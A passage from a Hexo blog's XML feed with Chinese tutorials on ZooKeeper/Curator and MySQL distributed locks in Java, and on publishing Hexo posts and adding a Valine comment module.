Maps.newConcurrentMap();<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockData</span><br>&#123;<br>    <span class="hljs-keyword">final</span> Thread owningThread; <span class="hljs-comment">// 所属线程</span><br>    <span class="hljs-keyword">final</span> String lockPath; <span class="hljs-comment">// 锁路径</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">lockCount</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// 重入次数</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">LockData</span><span class="hljs-params">(Thread owningThread, String lockPath)</span><br>    &#123;<br>        <span class="hljs-built_in">this</span>.owningThread = owningThread;<br>        <span class="hljs-built_in">this</span>.lockPath = lockPath;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>获取新的锁时，会调用 <code>internals.attemptLock()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java">String <span class="hljs-title function_">attemptLock</span><span class="hljs-params">(<span class="hljs-type">long</span> time, TimeUnit unit, <span class="hljs-type">byte</span>[] lockNodeBytes)</span> <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">long</span>      <span class="hljs-variable">startMillis</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">Long</span>      <span class="hljs-variable">millisToWait</span> <span class="hljs-operator">=</span> (unit != <span class="hljs-literal">null</span>) ? unit.toMillis(time) : <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[]    localLockNodeBytes = (revocable.get() != <span class="hljs-literal">null</span>) ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>] : lockNodeBytes;<br>    <span class="hljs-type">int</span>             <span class="hljs-variable">retryCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">String</span>          <span class="hljs-variable">ourPath</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">boolean</span>         <span class="hljs-variable">hasTheLock</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">boolean</span>         <span class="hljs-variable">isDone</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">// 死循环重复尝试获取锁</span><br>    <span class="hljs-keyword">while</span> ( !isDone )<br>    &#123;<br>        isDone = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            <span class="hljs-comment">// 创建一个当前锁的节点（临时序列化节点），并获取当前锁的全路径</span><br>            ourPath = driver.createsTheLock(client, path, localLockNodeBytes);<br>            hasTheLock = internalLockLoop(startMillis, millisToWait, ourPath);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( KeeperException.NoNodeException e )<br>        &#123;<br>            <span class="hljs-keyword">if</span> ( client.getZookeeperClient().getRetryPolicy().allowRetry(retryCount++, System.currentTimeMillis() - startMillis, RetryLoop.getDefaultRetrySleeper()) )<br>            &#123;<br>                isDone = <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-keyword">throw</span> e;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( hasTheLock )<br>    &#123;<br>        <span class="hljs-keyword">return</span> ourPath;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h4 id="3-6-2-其它锁"><a href="#3-6-2-其它锁" class="headerlink" title="3.6.2 其它锁"></a>3.6.2 其它锁</h4><ol><li><p>InterceProcessSemaphoreMutex：不可重入锁，其它与InterProcessMutex一致</p></li><li><p>InterProcessReadWriteMutex：读写锁 -&gt; 读读可并发，读写不可并发，写写不可并发</p><p>有一个不同于Redisson分布式读写锁的特点：写锁在释放之前仍会阻塞请求线程，而读锁不会</p><ol><li><p>在StockController中加入如下两个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;test/zk/read/lock&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">testZkReadLock</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.stockService.testZkReadLock();<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello test Zk read lock&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@GetMapping(&quot;test/zk/write/lock&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">testZkWriteLock</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.stockService.testZkWriteLock();<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello test Zk write lock&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在StockService中加入如下两个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testZkReadLock</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">InterProcessReadWriteLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InterProcessReadWriteLock</span>(curatorFramework, <span class="hljs-string">&quot;/curator/rwLock&quot;</span>);<br>        lock.readLock().acquire(<span class="hljs-number">10</span>, TimeUnit.SECONDS);<br>        <span class="hljs-comment">//lock.readLock().release();</span><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testZkWriteLock</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">InterProcessReadWriteLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InterProcessReadWriteLock</span>(curatorFramework, <span class="hljs-string">&quot;/curator/rwLock&quot;</span>);<br>        lock.writeLock().acquire(<span class="hljs-number">10</span>, TimeUnit.SECONDS);<br>        <span class="hljs-comment">//lock.readLock().release();</span><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li><li><p>InterProcessMultiLock：联锁。所有的锁都加锁成功才算成功，否则加锁失败</p></li><li><p>InterProcessSemaphoreV2：信号量。限流作用</p><p>修改StockService中的testSemaphore方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSemaphore</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">InterProcessSemaphoreV2</span> <span class="hljs-variable">semaphore</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InterProcessSemaphoreV2</span>(curatorFramework, <span class="hljs-string">&quot;/curator/locks&quot;</span>, <span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Lease</span> <span class="hljs-variable">lease</span> <span class="hljs-operator">=</span> semaphore.acquire();<br>        <span class="hljs-built_in">this</span>.redisTemplate.opsForList().rightPush(<span class="hljs-string">&quot;log&quot;</span>, <span class="hljs-string">&quot;10086获取资源，开始处理...&quot;</span> + Thread.currentThread().getName());<br>        TimeUnit.SECONDS.sleep(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">10</span>));<br>        <span class="hljs-built_in">this</span>.redisTemplate.opsForList().rightPush(<span class="hljs-string">&quot;log&quot;</span>, <span class="hljs-string">&quot;10086处理完成，释放资源...&quot;</span> + Thread.currentThread().getName());<br>        semaphore.returnLease(lease);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>共享计数器：类似于CountDownLatch</p><p>Curator提供了两个实现类：SharedCount与DistributedAtomicNumber </p><p>SharedCount实现如下：</p><ol><li><p>StockController中新增如下方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;test/sharedCount&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">testSharedCount</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.stockService.testSharedCount();<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello test SharedCount&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>StockService中新增如下方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSharedCount</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">SharedCount</span> <span class="hljs-variable">sharedCount</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedCount</span>(curatorFramework, <span class="hljs-string">&quot;/curator/sharedcount&quot;</span>, <span class="hljs-number">100</span>);<br>        sharedCount.start();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> sharedCount.getCount();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">1000</span>);<br>        sharedCount.setCount(random);<br>        System.out.println(<span class="hljs-string">&quot;共享计数器初始值为：&quot;</span> + count + <span class="hljs-string">&quot;, 现在值为：&quot;</span> + random);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h2 id="4-MySQL分布式锁"><a href="#4-MySQL分布式锁" class="headerlink" title="4. MySQL分布式锁"></a>4. MySQL分布式锁</h2><h3 id="4-1-实现方案"><a href="#4-1-实现方案" class="headerlink" title="4.1 实现方案"></a>4.1 实现方案</h3><p>数据库准备工作</p><ol><li><p>新建一张表tb_lock，两个字段分别为：id、lock_name</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221020232747128.png" alt="image-20221020232747128"></p></li><li><p>为lock_name设置索引，索引类型为unique唯一键索引</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221020232946531.png" alt="image-20221020232946531"></p></li></ol><p>思路为：</p><ol><li><p>加锁时执行如下SQL语句，若执行成功则代表加锁成功</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> tb_lock(lock_name) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;lock&#x27;</span>)<br></code></pre></td></tr></table></figure></li><li><p>释放锁时，通过delete删除对应的锁记录</p></li></ol><p>代码实现：</p><ol><li><p>在pojo包下新建Lock类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@TableName(&quot;tb_lock&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Lock</span> &#123;<br><br>    <span class="hljs-keyword">private</span> Long id;<br>    <span class="hljs-keyword">private</span> String lockName;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在mapper包下创建LockMapper接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">LockMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseMapper</span>&lt;Lock&gt; &#123;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>修改StockService中的deduct方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Lock</span>();<br>        lock.setLockName(<span class="hljs-string">&quot;lock&quot;</span>);<br>        <span class="hljs-built_in">this</span>.lockMapper.insert(lock);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(<span class="hljs-string">&quot;stock&quot;</span>).toString();<br>        <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.length() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">Integer</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> Integer.valueOf(stock);<br>            <span class="hljs-keyword">if</span> (st &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// 扣减库存</span><br>                redisTemplate.opsForValue().set(<span class="hljs-string">&quot;stock&quot;</span>, String.valueOf(--st));<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">this</span>.lockMapper.deleteById(lock.getId());<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Thread.sleep(<span class="hljs-number">50</span>);<br>            <span class="hljs-built_in">this</span>.deduct();<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(ex);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>经过JMeter测试之后发现，基于MySQL实现的分布式锁虽然实现了并发下将库存减为0的功能，但是性能极差。</p><h3 id="4-2-小结"><a href="#4-2-小结" class="headerlink" title="4.2 小结"></a>4.2 小结</h3><ol><li><p>独占排他互斥使用：采用唯一键索引实现</p></li><li><p>防死锁：客户端程序获取到锁之后，客户端服务器宕机造成死锁。</p><ul><li><p>解决方案：为tb_lock表添加获取锁时间字段lock_time，根据系统当前时间进行判断是否超时。</p><p>需要采用额外的定时器去检查获取锁的系统时间与当前系统时间的差值是否超过某一阈值</p></li></ul></li><li><p>可重入：</p><ul><li>解决方案：为tb_lock表添加server_id字段，代表对应的服务器；添加thread_id字段，代表对应服务器的线程；添加count字段，代表重入次数。</li></ul></li><li><p>防误删：借助于id的唯一性防误删</p></li><li><p>原子性：单个写操作，还可借助MySQL悲观锁</p></li><li><p>自动续期：使用服务内的定时器重置获取锁的系统时间</p></li><li><p>单机故障：搭建MySQL主备服务器</p></li><li><p>集群下锁机制失效：难解决</p></li><li><p>阻塞锁：难实现</p></li></ol><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><ol><li>简易程度：MySQL最简单，其次Redis，Zookeeper最难</li><li>性能：Redis &gt; Zookeeper &gt; MySQL</li><li>可靠性：Zookeeper &gt; Redis &#x3D; MySQL</li></ol><ul><li>如果要求不高、只实现独占排他、不要求可靠性与性能，选择MySQL</li><li>如果追求性能，选择Redis</li><li>如果追求可靠性，选择Zookeeper</li></ul>]]></content>
    
    
    <categories>
      
      <category>分布式</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>SpringBoot</tag>
      
      <tag>MySQL</tag>
      
      <tag>Redis</tag>
      
      <tag>锁</tag>
      
      <tag>分布式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo从0到1搭建博客系列03：文章与评论模块</title>
    <link href="/2022/10/05/Hexo%E4%BB%8E0%E5%88%B01%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%B3%BB%E5%88%9703%EF%BC%9A%E6%96%87%E7%AB%A0%E4%B8%8E%E8%AF%84%E8%AE%BA%E6%A8%A1%E5%9D%97/"/>
    <url>/2022/10/05/Hexo%E4%BB%8E0%E5%88%B01%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%B3%BB%E5%88%9703%EF%BC%9A%E6%96%87%E7%AB%A0%E4%B8%8E%E8%AF%84%E8%AE%BA%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="Hexo从0到1搭建博客系列03：文章与评论模块"><a href="#Hexo从0到1搭建博客系列03：文章与评论模块" class="headerlink" title="Hexo从0到1搭建博客系列03：文章与评论模块"></a>Hexo从0到1搭建博客系列03：文章与评论模块</h1><h2 id="1-文章的编辑与发布"><a href="#1-文章的编辑与发布" class="headerlink" title="1. 文章的编辑与发布"></a>1. 文章的编辑与发布</h2><p>在这一部分，我们主要学习如何编辑文章，并将其发布在Hexo博客上。</p><p>这一部分我们仍然在Hexo博客根目录上操作。</p><ol><li>执行以下命令，创建一篇新的文章。引号内为博客的标题</li></ol>  <figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;&quot;</span><br>e.g.: hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;我的第一篇博客&quot;</span><br></code></pre></td></tr></table></figure><p>  如图所示，该博客已经被创建到 <code>source/_posts</code> 目录下啦</p><p>  <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/first-blog.png"></p><ol start="2"><li>编辑该页面，可以看到如下信息（可以采用 <a href="https://github.com/marktext/marktext">MarkText</a> 进行编辑，这个是免费的）</li></ol>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">我的第一篇博客</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2022-10-05 16:00:30</span><br><span class="hljs-attr">tags:</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>  其中包含了博客的 <code>title</code>、<code>date</code>、<code>tags</code>信息</p><ol start="3"><li>接下来，我们编辑博客的 <code>tags</code> 与 <code>categories</code>，仍然需要注意 <code>yaml</code> 格式</li></ol>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">我的第一篇博客</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2022-10-05 16:00:30</span><br><span class="hljs-attr">tags:</span> [<span class="hljs-string">学习感悟</span>, <span class="hljs-string">知识分享</span>, <span class="hljs-string">Java</span>]<br><span class="hljs-attr">categories:</span> [<span class="hljs-string">Java基础</span>]<br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><ol start="4"><li>在下面接着编辑博客内容（可以采用 <a href="https://github.com/marktext/marktext">MarkText</a> 进行编辑，这个是免费的）</li></ol><p>  示例如下：</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">我的第一篇博客</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2022-10-05 16:00:30</span><br><span class="hljs-attr">tags:</span> [<span class="hljs-string">学习感悟</span>, <span class="hljs-string">知识分享</span>, <span class="hljs-string">Java</span>]<br><span class="hljs-attr">categories:</span> [<span class="hljs-string">Java基础</span>]<br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-comment"># 我的第一篇博客</span><br><br><span class="hljs-comment">## 1. Java基础</span><br><br><span class="hljs-string">Java是一门后端语言，我爱Java。</span><br><br><span class="hljs-comment">## 2. Java实战</span><br><br><span class="hljs-string">第一行代码</span><br><br><span class="hljs-string">```java</span><br><span class="hljs-string">System.out.println(&quot;Hello</span> <span class="hljs-string">World!&quot;);</span><br></code></pre></td></tr></table></figure><ol start="5"><li><code>Ctrl + S</code> 保存，然后将博客运行到本地服务器。</li></ol>  <figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">hexo <span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>这样一来就可以完成博客的编辑与发布啦，看看成品吧~</p><p>下面那一篇是 <code>Hexo</code> 初始化的文章</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/blog-content1.png" alt="https//cdnjsdelivrnet/gh/ltyzzzxxx/ltyzzzImageBed/blogimg/blogcontentpng"></p><p>进入 <code>分类</code>、<code>标签</code> 页可以看到相应的内容</p><h2 id="2-引入评论模块"><a href="#2-引入评论模块" class="headerlink" title="2. 引入评论模块"></a>2. 引入评论模块</h2><p>引入评论听起来非常高大上。如果自己手动搭建一个评论系统，将是需要一定技术的工作，而在<code>Hexo-Fluid</code> 中，这仅仅只是一个简单的配置</p><ol><li>打开之前粘贴好的 <code>_config.fluid.yml</code> 文件，找到以下内容。</li></ol>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">post:</span><br>  <span class="hljs-attr">comments:</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">disqus</span><br></code></pre></td></tr></table></figure><p>  这里我推荐使用另外一个评论插件 <code>Valine</code>，所以将type进行相应的更改。</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">post:</span><br>  <span class="hljs-attr">comments:</span><br>    <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">type:</span> <span class="hljs-string">valine</span><br></code></pre></td></tr></table></figure><p>  其他评论插件官方文档有详细的写，如果想尝试其他的，请点击[这里](<a href="https://hexo.fluid-dev.com/docs/guide/#%E8%AF%84%E8%AE%BA">配置指南 | Hexo Fluid 用户手册</a>)查找~</p><ol start="2"><li><p>进入 <a href="https://valine.js.org/quickstart.html">Valine</a> 主页，注册一个 <code>LeanCloud</code> 账号，然后完成相应的实名认证。这一部分就比较简单啦，不再赘述。</p></li><li><p>进入 <code>LeanCloud</code> 个人主页控制台，左上角创建应用。</p></li></ol><p>  我已经创建过啦，就不再创建了。</p><p>  <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/leadcloud-page.png"></p><ol start="4"><li>点击进入创建好的应用，点击左侧菜单 设置 - 应用凭证，就可以看到相应的配置信息啦</li></ol><p>  <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/leancloud-key.png"></p><ol start="5"><li>将 <code>AppID</code> 与 <code>AppKey</code> 复制并粘贴到 <code>_config.fluid.yml</code> 文件中如下相应的位置</li></ol>  <figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">valine:</span><br>  <span class="hljs-attr">appId:</span> <span class="hljs-string">xxxxx</span><br>  <span class="hljs-attr">appKey:</span> <span class="hljs-string">xxxxx</span><br></code></pre></td></tr></table></figure><ol start="6"><li>保存配置文件，再次运行博客到本地服务器</li></ol>  <figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">hexo <span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>打开之前发布的博客页，拉到最底部，即可看到评论界面啦~</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/comment.png"></p><p>由于 <code>Valine</code> 是一个无后端评论系统，想要管理评论的话，得去 <code>LeanCloud</code> 后台数据存储进行管理相关评论数据。</p><h2 id="3-后记"><a href="#3-后记" class="headerlink" title="3. 后记"></a>3. 后记</h2><p>如果大家觉得我的内容写的还不错，可以在评论区留言支持一下呀~</p><p>欢迎大家来逛一逛我的<a href="https://ltyzzzxxx.github.io/">个人博客</a>~</p><p>此外，从2022.10.1开始，为激励自己持续刷题，我开始持续日更Leetcode题解啦~</p><p>所有题解均已放到<a href="https://github.com/ltyzzzxxx/Leetcode-Everyday">Github仓库</a>中，欢迎大家Star并提出Issue~</p>]]></content>
    
    
    <categories>
      
      <category>Hexo搭建博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo从0到1搭建博客系列02：引入Fluid</title>
    <link href="/2022/10/05/Hexo%E4%BB%8E0%E5%88%B01%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%B3%BB%E5%88%9702%EF%BC%9A%E5%BC%95%E5%85%A5Fluid/"/>
